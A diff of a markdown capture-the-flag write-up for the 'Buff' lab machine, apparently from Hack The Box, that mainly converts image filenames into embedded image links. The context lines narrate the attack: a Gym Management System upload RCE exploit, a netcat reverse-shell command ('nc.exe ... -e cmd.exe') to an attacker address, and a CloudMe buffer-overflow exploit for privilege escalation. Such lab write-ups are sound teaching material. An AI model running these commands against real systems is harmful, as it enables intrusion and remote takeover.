@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-Buff.png
+![Buff.png](../assets/buff_assets/Buff.png)
 
 ### Enumeration
 
@@ -49,11 +49,11 @@ Nmap done: 1 IP address (1 host up) scanned in 58.49 seconds
 
 Navigating to the site, we find what appears to be a gym website. I poked around not seeing too much of interest, until I found the Contact page. Looking here I find some more info about the software being used:
 
-software.png
+![software.png](../assets/buff_assets/software.png)
 
 Not being familiar with this software, first thing I do is look it up using Searchsploit to see if there are any vulnerabilities/ exploits to be found.
 
-searchsploit.png
+![searchsploit.png](../assets/buff_assets/searchsploit.png)
 
 Nice! I'm especially interested in the unauthenticated RCE exploit. You can either download it directly from searchsploit, or go out and grab it from ExploitDB (https://www.exploit-db.com/exploits/48506) Looking at the exploit, the comments state "Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters."
 
@@ -70,7 +70,7 @@ I execute the exploit at the target using:
 
 The foothold was a breeze. After firing the script I'm presented with a web-shell, where I can grab user.txt.
 
-user_flag.png
+![user_flag.png](../assets/buff_assets/user_flag.png)
 
 ### Privilege Escalation
 
@@ -90,11 +90,11 @@ nc.exe 10.10.14.28 1234 -e cmd.exe
 
 Great, now we have a stable, fully interactive shell to work with. 
 
-stable_shell.png
+![stable_shell.png](../assets/buff_assets/stable_shell.png)
 
 Browsing around the machine, I find and interesting executable in Shaun's Downloads folder:
 
-find_cloudme.png
+![find_cloudme.png](../assets/buff_assets/find_cloudme.png)
 
 It also looks like the version number is being listed as well. Turning to ExploitDB to see if I can find any public exploits, I quickly find this one: https://www.exploit-db.com/exploits/48389. This is a Python script, which should be pretty straightforward to execute. 
 
@@ -196,11 +196,11 @@ python cloudme-1112-bof.py
 
 and check our netcat listener for a reverse shell as administrator:
 
-root_flag.txt
+![root_flag.txt](../assets/buff_assets/root_flag.png)
 
 Nice!
 
-This was a great easy level box, with a  simple foothold and privilege escalation, but gave users the ability to practice tunneling, which makes it more unique and fun. 
+This was a great easy level box, with a simple foothold and privilege escalation, but gave users the ability to practice tunneling, which makes it more unique and fun. 
 
 Thanks for following along!
 
